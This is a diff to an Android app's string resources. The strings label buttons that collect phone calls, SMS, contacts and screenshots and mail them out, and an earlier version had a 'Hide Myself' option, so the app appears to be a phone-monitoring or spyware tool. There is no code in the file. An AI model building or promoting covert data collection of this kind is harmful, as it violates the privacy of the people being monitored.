@@ -48,13 +48,17 @@
     <string name="init_btn_getinfo">Get Info</string>
     <string name="init_btn_screenshot">Screenshot</string>
     <string name="init_btn_setting">Setting</string>
-    <string name="init_btn_hide">Hide Myself</string>
+    <string name="init_btn_hide">Exit</string>
+    <string name="init_hint_getinfo">Get phonecall, SMS, contact information and send a mail</string>
+    <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
+    <string name="init_hint_setting">Set username, serial number, mail address and interval</string>
+    <string name="init_hint_hide">Exit current setting dialog</string>
     
     <!-- License -->
-    <string name="licensed_yes">Get licensed successfully</string>
-    <string name="licensed_no">Wrong mail address or serial number</string>
+    <string name="licensed_yes">Authenticated successfully! Thanks for your registration!</string>
+    <string name="licensed_no">Wrong user name or serial number</string>
     <string name="pls_input_serial_num">Please input serial number</string>
-    <string name="pls_input_mail">Please input correct mail address</string>
+    <string name="pls_input_mail">Incorrect mail address format. Please input correct mail address</string>
     <string name="pls_input_username">Please input user name</string>
     
 </resources>
